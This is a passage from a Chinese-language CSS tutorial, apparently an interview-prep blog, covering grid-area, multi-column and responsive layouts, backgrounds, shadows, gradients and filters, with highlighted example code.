css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 跨3行2列 */</span><br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">2</span> / <span class="hljs-number">1</span> / span <span class="hljs-number">3</span> / span <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）同名 grid-area 的项目会发生什么</p><ul><li>根据 DOM 顺序层叠（后者覆盖前者），可通过 z-index 控制层级</li></ul><p>（3）如何使用 grid-area 实现圣杯布局</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar main&quot;</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span> &#123; <span class="hljs-attribute">grid-area</span>: header; &#125;<br><span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">grid-area</span>: sidebar; &#125;<br><span class="hljs-selector-class">.main</span> &#123; <span class="hljs-attribute">grid-area</span>: main; &#125;<br></code></pre></td></tr></table></figure><h3 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h3><ul><li>所有现代浏览器都支持</li><li>可以使用 <code>@supports</code> 检测<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@supports</span> (<span class="hljs-attribute">display</span>: <span class="hljs-attribute">grid</span>) &#123;<br>  <span class="hljs-selector-class">.item</span> &#123; <span class="hljs-attribute">grid-area</span>: main; &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="2-4-多列布局（column-count、column-gap）"><a href="#2-4-多列布局（column-count、column-gap）" class="headerlink" title="2.4 多列布局（column-count、column-gap）"></a>2.4 多列布局（column-count、column-gap）</h2><p>多列布局专为文本内容的分栏展示设计，适合新闻阅读、文档排版等场景</p><h3 id="核心属性"><a href="#核心属性" class="headerlink" title="核心属性"></a>核心属性</h3><p><strong>column-count - 分栏数量控制</strong></p><ul><li>作用：指定内容分为多少列</li><li>取值：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-count</span>: <span class="hljs-number">3</span>; <span class="hljs-comment">/* 固定3栏 */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>auto（默认）：由其他属性（如column-width）决定列数</li><li>整数：强制分栏数量（内容不足时会留空）</li></ul></li></ul><p><strong>column-gap - 栏间间距</strong></p><ul><li>作用：控制列与列之间的间隙</li><li>语法：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">2em</span>;    <span class="hljs-comment">/* 相对单位 */</span><br>  <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">24px</span>;   <span class="hljs-comment">/* 固定像素 */</span><br>  <span class="hljs-attribute">column-gap</span>: normal; <span class="hljs-comment">/* 浏览器默认值（通常1em） */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li>与Grid&#x2F;Flex的gap区别：多列布局的gap仅支持单值（不支持行列分别设置）</li></ul><h3 id="完整属性体系"><a href="#完整属性体系" class="headerlink" title="完整属性体系"></a>完整属性体系</h3><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">column-width</td><td align="left">每列理想宽度（实际可能调整）</td><td align="left">200px &#x2F; auto</td></tr><tr><td align="left">column-count</td><td align="left">最大分栏数</td><td align="left">3 &#x2F; auto</td></tr><tr><td align="left">column-gap</td><td align="left">栏间间距</td><td align="left">1em &#x2F; 20px</td></tr><tr><td align="left">column-rule</td><td align="left">栏间分隔线（类似border）</td><td align="left">1px solid #ddd</td></tr><tr><td align="left">column-fill</td><td align="left">内容填充方式</td><td align="left">auto &#x2F; balance</td></tr><tr><td align="left">column-span</td><td align="left">元素跨列（仅all&#x2F;none）</td><td align="left">all（标题跨所有列）</td></tr></tbody></table><h2 id="2-5-响应式布局（-media-查询、移动优先策略）"><a href="#2-5-响应式布局（-media-查询、移动优先策略）" class="headerlink" title="2.5 响应式布局（@media 查询、移动优先策略）"></a>2.5 响应式布局（@media 查询、移动优先策略）</h2><h3 id="响应式核心机制：-media-查询"><a href="#响应式核心机制：-media-查询" class="headerlink" title="响应式核心机制：@media 查询"></a>响应式核心机制：@media 查询</h3><p>作用：根据设备特性（宽度、分辨率、方向等）应用不同的CSS规则</p><p><strong>基础语法结构</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@media</span> [媒体类型] [<span class="hljs-keyword">and</span>] (媒体特征) &#123;<br>  <span class="hljs-comment">/* 条件满足时应用的CSS */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关键媒体特征</strong></p><table><thead><tr><th align="left">特征</th><th align="left">应用场景</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">min-width &#x2F; max-width</td><td align="left">视口宽度断点</td><td align="left">(min-width: 768px)</td></tr><tr><td align="left">orientation</td><td align="left">设备方向</td><td align="left">(orientation: portrait)</td></tr><tr><td align="left">resolution</td><td align="left">屏幕分辨率</td><td align="left">(min-resolution: 2dppx)</td></tr><tr><td align="left">hover</td><td align="left">输入设备是否支持悬停</td><td align="left">(hover: hover)</td></tr><tr><td align="left">prefers-color-scheme</td><td align="left">系统深色模式</td><td align="left">(prefers-color-scheme: dark)</td></tr></tbody></table><p><strong>复合条件查询</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 平板横屏且最小宽度1024px */</span><br><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">1024px</span>) <span class="hljs-keyword">and</span> (<span class="hljs-attribute">orientation</span>: landscape) &#123;<br>  <span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">display</span>: block; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="移动优先（mobile-first）策略"><a href="#移动优先（mobile-first）策略" class="headerlink" title="移动优先（mobile-first）策略"></a>移动优先（mobile-first）策略</h3><p><strong>核心理念</strong></p><p>先为移动设备编写基础样式，再通过 <code>min-width</code> 逐步增强大屏体验</p><p><strong>代码实现范式</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 基础样式（移动端） */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;<br>&#125;<br><br><span class="hljs-comment">/* 平板适配（≥768px） */</span><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/* 桌面端适配（≥1200px） */</span><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">1200px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">max-width</span>: <span class="hljs-number">1140px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="第三章：CSS-视觉与动画"><a href="#第三章：CSS-视觉与动画" class="headerlink" title="第三章：CSS 视觉与动画"></a>第三章：CSS 视觉与动画</h1><h2 id="3-1-背景与边框（background、border-radius、box-shadow）"><a href="#3-1-背景与边框（background、border-radius、box-shadow）" class="headerlink" title="3.1 背景与边框（background、border-radius、box-shadow）"></a>3.1 背景与边框（background、border-radius、box-shadow）</h2><h3 id="背景-background-复合属性"><a href="#背景-background-复合属性" class="headerlink" title="背景 - background 复合属性"></a>背景 - background 复合属性</h3><p>现代 CSS 背景已发展为包含 8 个子属性的强大系统</p><p><strong>分层背景（支持多背景图）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">.<span class="hljs-property">hero</span> &#123;<br>  <span class="hljs-attr">background</span>: <br>    linear-<span class="hljs-title function_">gradient</span>(<span class="hljs-title function_">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.3</span>), transparent),<br>    <span class="hljs-title function_">url</span>(<span class="hljs-string">&#x27;hero-bg.jpg&#x27;</span>) center/cover no-repeat,<br>    #f5f5f5; <span class="hljs-comment">/* 兜底颜色 */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>层叠顺序：先声明的背景在上层</li></ul><p><strong>关键子属性详解</strong></p><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">background-image</td><td align="left">设置背景图像&#x2F;渐变</td><td align="left">url(‘img.png’), linear-gradient(to right, red, blue)</td></tr><tr><td align="left">background-size</td><td align="left">控制尺寸（需配合position）</td><td align="left">cover&#x2F;contain&#x2F;100px 50px</td></tr><tr><td align="left">background-position</td><td align="left">定位起始点</td><td align="left">center&#x2F;right</td></tr><tr><td align="left">background-repeat</td><td align="left">重复行为</td><td align="left">no-repeat&#x2F;space&#x2F;round</td></tr><tr><td align="left">background-origin</td><td align="left">定位基准（与border&#x2F;padding的关系）</td><td align="left">border-box&#x2F;content-box</td></tr><tr><td align="left">background-clip</td><td align="left">绘制区域</td><td align="left">text（文字镂空效果）</td></tr><tr><td align="left">background-attachment</td><td align="left">滚动行为</td><td align="left">fixed（视口固定背景）</td></tr><tr><td align="left">background-blend-mode</td><td align="left">混合模式</td><td align="left">multiply&#x2F;screen</td></tr></tbody></table><p><strong>性能优化技巧</strong></p><p>（1）雪碧图（sprite）自动化</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.icon</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;sprite.png&#x27;</span>) no-repeat;<br>  <span class="hljs-attribute">background-position</span>: -<span class="hljs-number">120px</span> -<span class="hljs-number">80px</span>; <span class="hljs-comment">/* 通过工具自动计算 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）WebP 格式优先</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.banner</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;image.webp&#x27;</span>);<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">image-set</span>(<span class="hljs-string">&#x27;image.webp&#x27;</span> <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;image/webp&#x27;</span>), <span class="hljs-string">&#x27;image.jpg&#x27;</span> <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="border-radius-高级技巧"><a href="#border-radius-高级技巧" class="headerlink" title="border-radius 高级技巧"></a>border-radius 高级技巧</h3><p><strong>椭圆与复杂形状</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.btn</span> &#123;<br>  <span class="hljs-comment">/* 水平半径 / 垂直半径 */</span><br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span> <span class="hljs-number">20%</span> <span class="hljs-number">30%</span> <span class="hljs-number">40%</span> / <span class="hljs-number">60%</span> <span class="hljs-number">30%</span> <span class="hljs-number">70%</span> <span class="hljs-number">40%</span>; <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>8值语法：分别控制四个角的x&#x2F;y轴半径</li></ul><p><strong>圆角头像</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.avatar</span> &#123;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">aspect-ratio</span>: <span class="hljs-number">1</span>; <span class="hljs-comment">/* 确保宽高相等 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>胶囊按钮</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.pill-button</span> &#123;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">9999px</span>; <span class="hljs-comment">/* 超大值实现 */</span><br>  <span class="hljs-comment">/* 或 */</span><br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">1em</span> + <span class="hljs-number">4px</span>); <span class="hljs-comment">/* 动态适应字体 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>隐藏陷阱</strong></p><ul><li>子元素溢出：父元素设置overflow: hidden</li><li>背景剪裁：配合background-clip: border-box</li></ul><h3 id="box-shadow-立体感打造"><a href="#box-shadow-立体感打造" class="headerlink" title="box-shadow 立体感打造"></a>box-shadow 立体感打造</h3><p>可叠加多层的阴影系统</p><p><strong>完整语法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">box-shadow</span>: [inset] x-offset y-offset blur spread color;<br></code></pre></td></tr></table></figure><p>参数详解：</p><ul><li>inset：内阴影</li><li>spread：阴影扩展（正数放大&#x2F;负数收缩）</li><li>支持 RGBA 透明度控制</li></ul><p><strong>高级应用</strong></p><p>（1）多层阴影</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <br>    <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>),<br>    <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>); <span class="hljs-comment">/* 立体层次 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）霓虹效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.neon</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-number">#0ff</span>, <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-number">#0ff</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）边框替代方案（不占空间）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.border-alternative</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">#f00</span>; <span class="hljs-comment">/* 2px纯色外框 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="组合实战案例"><a href="#组合实战案例" class="headerlink" title="组合实战案例"></a>组合实战案例</h3><p>（1）玻璃拟态</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.glass</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>);<br>  <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">10px</span>);<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">12px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0.1</span>);<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">32px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）文档卡片悬浮</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.doc-card</span> &#123;<br>  <span class="hljs-attribute">transition</span>: box-shadow <span class="hljs-number">0.2s</span>;<br>&#125;<br><span class="hljs-selector-class">.doc-card</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">12px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.15</span>);<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试问题-1"><a href="#高频面试问题-1" class="headerlink" title="高频面试问题"></a>高频面试问题</h3><p><strong>Q：如何实现 1px 细线边框</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.thin-border</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.5px</span> <span class="hljs-number">#000</span>; <span class="hljs-comment">/* 高清屏解决方案 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：background-clip: text 的兼容性如何？</strong></p><ul><li>需配合-webkit-text-fill-color: transparent</li><li>备用方案：SVG文本背景</li></ul><h2 id="3-2-渐变与滤镜（linear-gradient、backdrop-filter）"><a href="#3-2-渐变与滤镜（linear-gradient、backdrop-filter）" class="headerlink" title="3.2 渐变与滤镜（linear-gradient、backdrop-filter）"></a>3.2 渐变与滤镜（linear-gradient、backdrop-filter）</h2><h3 id="CSS渐变-从基础到三维质感"><a href="#CSS渐变-从基础到三维质感" class="headerlink" title="CSS渐变 - 从基础到三维质感"></a>CSS渐变 - 从基础到三维质感</h3><p>CSS 渐变可替代图片实现高性能视觉效果</p><p><strong>linear-gradient 线性渐变</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<br>  [方向或角度], <br>  color-stop1, <br>  color-stop2, <br>  ...<br>);<br></code></pre></td></tr></table></figure><ul><li><p>方向控制</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 关键词 */</span><br><span class="hljs-selector-tag">to</span> <span class="hljs-attribute">right</span>, <span class="hljs-selector-tag">to</span> <span class="hljs-attribute">bottom</span> <span class="hljs-attribute">right</span><br><span class="hljs-comment">/* 角度 */</span><br><span class="hljs-number">45deg</span>, <span class="hljs-number">0.25turn</span><br></code></pre></td></tr></table></figure></li><li><p>色标高级控制</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<br>  to right,<br>  <span class="hljs-number">#ff0000</span> <span class="hljs-number">0%</span>,       <span class="hljs-comment">/* 纯红色起点 */</span><br>  <span class="hljs-number">#ff0000</span> <span class="hljs-number">20%</span>,      <span class="hljs-comment">/* 保持纯红到20% */</span><br>  <span class="hljs-number">#0000ff</span> <span class="hljs-number">80%</span>,      <span class="hljs-comment">/* 过渡到蓝色 */</span><br>  <span class="hljs-number">#0000ff</span> <span class="hljs-number">100%</span>      <span class="hljs-comment">/* 纯蓝色终点 */</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>案例：微信小程序按钮</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.btn-primary</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#07C160</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#09A855</span> <span class="hljs-number">100%</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>radial-gradient 径向渐变</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(<br>  [形状 at 位置],<br>  color-stop1,<br>  color-stop2<br>);<br></code></pre></td></tr></table></figure><ul><li><p>形状控制</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">circle</span> at center, <br><span class="hljs-selector-tag">ellipse</span> at <span class="hljs-number">20%</span> <span class="hljs-number">30%</span><br></code></pre></td></tr></table></figure></li><li><p>案例：logo 效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.logo</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(<br>    circle at <span class="hljs-number">30%</span> <span class="hljs-number">40%</span>,<br>    <span class="hljs-number">#ff0037</span> <span class="hljs-number">0%</span>,<br>    transparent <span class="hljs-number">60%</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>conic-gradient 锥形渐变</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 饼图/色轮实现 */</span><br><span class="hljs-attribute">background</span>: <span class="hljs-built_in">conic-gradient</span>(<br>  red <span class="hljs-number">0deg</span> <span class="hljs-number">90deg</span>, <br>  green <span class="hljs-number">90deg</span> <span class="hljs-number">180deg</span>, <br>  blue <span class="hljs-number">180deg</span> <span class="hljs-number">270deg</span>, <br>  yellow <span class="hljs-number">270deg</span> <span class="hljs-number">360deg</span><br>);<br></code></pre></td></tr></table></figure><h3 id="CSS滤镜-视觉魔法"><a href="#CSS滤镜-视觉魔法" class="headerlink" title="CSS滤镜 - 视觉魔法"></a>CSS滤镜 - 视觉魔法</h3><p>滤镜可对元素本身或背景进行实时图像处理。</p><p><strong>filter 常用函数</strong></p><table><thead><tr><th align="left">滤镜函数</th><th align="left">效果</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">blur()</td><td align="left">高斯模糊</td><td align="left">blur(5px)</td></tr><tr><td align="left">brightness()</td><td align="left">明暗度调整</td><td align="left">brightness(1.2)</td></tr><tr><td align="left">contrast()</td><td align="left">对比度调整</td><td align="left">contrast(150%)</td></tr><tr><td align="left">drop-shadow()</td><td align="left">投影（优于box-shadow）</td><td align="left">drop-shadow(2px 2px 4px #000)</td></tr><tr><td align="left">hue-rotate()</td><td align="left">色相旋转</td><td align="left">hue-rotate(90deg)</td></tr><tr><td align="left">grayscale()</td><td align="left">灰度化</td><td align="left">grayscale(100%)</td></tr></tbody></table><p>抖音风格特效：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.video-filter</span> &#123;<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">contrast</span>(<span class="hljs-number">1.2</span>) <span class="hljs-built_in">brightness</span>(<span class="hljs-number">1.1</span>) <span class="hljs-built_in">hue-rotate</span>(<span class="hljs-number">15deg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>backdrop-filter 背景滤镜</strong></p><p>仅处理元素背后的内容（需配合半透明背景）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.modal</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0.3</span>);<br>  <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">10px</span>) <span class="hljs-built_in">saturate</span>(<span class="hljs-number">180%</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>适用场景：<ul><li>毛玻璃效果</li><li>弹窗背景虚化</li></ul></li><li>兼容性方案：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@supports</span> <span class="hljs-keyword">not</span> (<span class="hljs-attribute">backdrop-filter</span>: blur(<span class="hljs-number">10px</span>)) &#123;<br>  <span class="hljs-selector-class">.modal</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0.9</span>); <span class="hljs-comment">/* 降级处理 */</span><br>  